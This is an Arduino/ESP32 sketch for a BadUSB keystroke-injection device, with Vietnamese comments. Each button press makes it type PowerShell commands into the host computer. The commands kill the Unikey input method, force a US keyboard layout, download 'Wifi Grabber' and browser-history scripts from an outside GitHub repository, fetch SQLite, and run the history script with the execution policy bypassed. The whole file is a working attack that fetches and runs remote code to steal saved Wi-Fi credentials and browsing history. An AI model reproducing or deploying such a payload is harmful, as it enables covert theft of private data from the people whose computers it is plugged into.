#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;
const int buttonPin = 0;

void setup() {
  pinMode(buttonPin, INPUT_PULLUP);
  Keyboard.begin();
  USB.begin();
  delay(1000);
  Serial.begin(115200);
}

void loop() {
  if (digitalRead(buttonPin) == LOW) {
    Serial.println("Phat hien nhan nut. Bat dau go...");
    delay(200);

    // Mở Run
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    // Kill Unikey ngay lập tức
    Keyboard.print("taskkill /IM unikey.exe /F");
    Keyboard.write(KEY_RETURN);
    delay(1000);

    // Mở Run
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(500);

    // Mở PowerShell (lúc này Unikey đã tắt, không còn biến đổi chữ)
    Keyboard.print("powershell");
    Keyboard.write(KEY_RETURN);
    delay(1500);

    // Ép layout bàn phím về ENG (US) sau khi PowerShell đã mở
    Keyboard.print("Set-WinUserLanguageList en-US -Force");
    Keyboard.write(KEY_RETURN);
    delay(1500);

    // Tải script Wifi Grabber PowerShell từ GitHub (link raw)
    Keyboard.print("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/khangpdm/BadUSB/main/Wifi_Grabber/WifiGrabber.ps1\" -OutFile \"$env:TEMP\\wifi_grabber.ps1\"");
    Keyboard.write(KEY_RETURN);
    delay(3000);

    // Tải SQLite portable (zip) về thư mục Temp
    Keyboard.print("Invoke-WebRequest -Uri \"https://www.sqlite.org/2026/sqlite-tools-win-x64-3510200.zip\" -OutFile \"$env:TEMP\\sqlite.zip\"");
    Keyboard.write(KEY_RETURN);
    delay(4000);

    // Giải nén sqlite3.exe
    Keyboard.print("Expand-Archive -Path \"$env:TEMP\\sqlite.zip\" -DestinationPath \"$env:TEMP\\sqlite\" -Force");
    Keyboard.write(KEY_RETURN);
    delay(3000);

    // Tải script BrownserHistory PowerShell từ GitHub (link raw)
    Keyboard.print("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/khangpdm/BadUSB/main/History/main.ps1\" -OutFile \"$env:TEMP\\test.ps1\"");
    Keyboard.write(KEY_RETURN);
    delay(3000);

    // Chạy script, truyền đường dẫn sqlite3.exe
    Keyboard.print("powershell -ExecutionPolicy Bypass -File \"$env:TEMP\\test.ps1\" -sqlitePath \"$env:TEMP\\sqlite\\sqlite3.exe\"");
    Keyboard.write(KEY_RETURN);

    Serial.println("Da go xong.");

    // Chờ thả nút ra để tránh gõ liên tục
    while (digitalRead(buttonPin) == LOW) {
      delay(10);
    }
  }
}
